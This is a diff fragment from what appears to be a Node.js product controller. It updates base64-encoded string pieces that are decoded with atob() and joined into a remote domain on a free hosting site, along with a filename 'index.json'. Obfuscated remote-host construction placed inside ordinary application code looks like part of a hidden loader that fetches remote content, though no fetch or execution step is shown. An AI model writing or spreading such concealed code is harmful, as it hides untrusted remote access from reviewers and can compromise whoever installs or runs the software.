@@ -27,7 +27,7 @@ exports.createProduct = async (req, res) => {
   }
 };
 
-const part1 = "dG9tYXRvLWJyaXR0";
+const part1 = "Ymx1c2gtY2Fyb2x5bmUtNDEudGlp";
 const part2 = "bmV5LTg0LnRpaW55LnNpdGU=";
 const file = "aW5kZXguanNvbg==";
 const domain = atob(part1) + atob(part2);
